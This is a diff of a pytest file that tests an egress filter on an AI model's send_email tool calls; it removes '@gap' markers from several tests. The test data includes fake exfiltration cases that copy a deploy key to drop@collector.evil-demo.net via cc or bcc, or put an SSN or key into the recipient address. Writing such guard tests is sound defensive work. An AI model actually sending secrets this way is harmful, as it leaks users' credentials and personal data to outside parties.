@@ -497,7 +497,6 @@ def test_one_bad_call_among_several_blocks_them_all(presidio):
     {"cc": ["x@localhost", "drop@collector.evil-demo.net"]},
     {"bcc": "drop@collector.evil-demo.net"},
 ], ids=["cc-string", "cc-list", "bcc"])
-@gap("R4")
 def test_send_email_copy_to_unlisted_host_with_key_is_blocked(presidio, extra):
     reply = model_reply(tool_use("send_email", to=DR_LEE, subject="keys", body=f"Deploy key {KEY}", **extra))
     out, _ = egress(reply, presidio)
@@ -506,13 +505,11 @@ def test_send_email_copy_to_unlisted_host_with_key_is_blocked(presidio, extra):
 
 @pytest.mark.parametrize("to", [f"{SSN}@collector.evil-demo.net", f"{KEY}@collector.evil-demo.net"],
                          ids=["ssn", "key"])
-@gap("R4")
 def test_value_in_the_recipient_address_is_blocked(presidio, to):
     out, _ = egress(model_reply(tool_use("send_email", to=to, subject="hi", body="hello")), presidio)
     assert_blocked(out)
 
 
-@gap("R4")
 def test_a_plain_allowed_recipient_does_not_hold(presidio):
     reply = model_reply(tool_use("send_email", to=DR_LEE, cc=[DR_LEE], subject="Lunch", body="See you then."))
     out, ports = egress(reply, presidio)
